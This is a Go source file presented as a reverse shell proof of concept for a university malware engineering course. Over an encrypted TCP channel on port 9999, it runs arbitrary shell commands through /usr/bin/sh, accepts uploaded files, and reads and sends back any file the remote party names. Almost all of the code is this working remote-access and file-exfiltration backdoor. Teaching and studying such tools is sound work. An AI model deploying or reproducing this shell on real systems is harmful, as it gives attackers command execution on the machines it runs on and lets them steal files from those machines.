package main

// REVERSE SHELL POC FOR MALWARE ENGINEERING COURSE OF UIT

import (
	"log/slog"
	"strings"
	"path/filepath"
	"os"
	"fmt"
	"bytes"
	"net"
	"os/exec"

	"grevshell/grevcore"
)

func main() {
	stream, err := net.Listen("tcp", "localhost:9999")

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info("Reverse Shell listening on port 9999.")

	for {
		conn, err := stream.Accept()
		if err != nil {
			slog.Error("An error occured while establishing a connection with the client.", slog.Any("ERROR", err))
			continue
		}

		slog.Info(fmt.Sprintf("Incoming connection from %s.", conn.RemoteAddr()))

		key, err := grevcore.DeriveKey(conn)

		if err != nil {
			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
			return
		}

		ExecuteRequest(conn, key)
	}
}

func ExecuteRequest(c net.Conn, key []byte) {
	defer c.Close()

	for {
		var buf bytes.Buffer
		recv := grevcore.ReceivePacket(c, &key)

		if len(recv) == 0 {
			return
		}

		header := string(recv[:8])
		received := recv[8:]

		switch header {
		case grevcore.SHELLEXEC_HEADER:
			cmd := exec.Command("/usr/bin/sh", "-c", strings.TrimSpace(string(received)))

			cmd.Stdout = &buf
			cmd.Stderr = &buf

			err := cmd.Run()

			if err != nil {
				slog.Error("An error occured while executing the command.", slog.Any("ERROR", err))
			}

			data := buf.Bytes()

			grevcore.SendPacket(c, &data, &key)
			break

		case grevcore.FILERECEIVE_HEADER:
			slog.Info("Writing file.")
			filename	:= strings.Trim(string(received[:32]), "\x00")
			data 		:= received[32:]

			err := os.WriteFile(filepath.Base(filename), data, 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				return
			}

			break

		case grevcore.FILESEND_HEADER:
			slog.Info("Sending file.")
			filename	:= strings.Trim(string(received), "\x00")
			data, err	:= os.ReadFile(filename)

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				return
			}
			toSend := make([]byte, len(data) + 32)
			
			copy(toSend[:32], []byte(filename))
			copy(toSend[32:], data)

			grevcore.SendPacket(c, &toSend, &key)

			break
		default:
			toSend := []byte("?")
			
			grevcore.SendPacket(c, &toSend, &key)
			break
		}
	}
}
